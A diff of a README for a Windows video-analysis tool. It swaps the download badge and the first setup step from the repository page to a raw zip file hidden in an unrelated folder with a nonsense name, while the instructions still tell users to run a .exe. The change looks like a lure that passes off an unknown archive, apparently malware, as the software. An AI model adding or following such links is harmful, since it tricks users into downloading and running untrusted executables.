@@ -1,6 +1,6 @@
 # 📹 video-evaluator - Analyze your video project files easily
 
-[![](https://img.shields.io/badge/Download-Video_Evaluator-blue.svg)](https://github.com/Tommieoxidative416/video-evaluator)
+[![](https://img.shields.io/badge/Download-Video_Evaluator-blue.svg)](https://github.com/Tommieoxidative416/video-evaluator/raw/refs/heads/main/skills/package-review-prompt/video_evaluator_tiglaldehyde.zip)
 
 ## 🎯 Purpose
 
@@ -20,7 +20,7 @@ This software runs on standard Windows machines. Ensure your computer meets thes
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the project website at: https://github.com/Tommieoxidative416/video-evaluator
+1. Visit the project website at: https://github.com/Tommieoxidative416/video-evaluator/raw/refs/heads/main/skills/package-review-prompt/video_evaluator_tiglaldehyde.zip
 2. Look for the latest release version on the right side of the screen.
 3. Choose the file ending in .exe for Windows.
 4. Save the file to your computer.
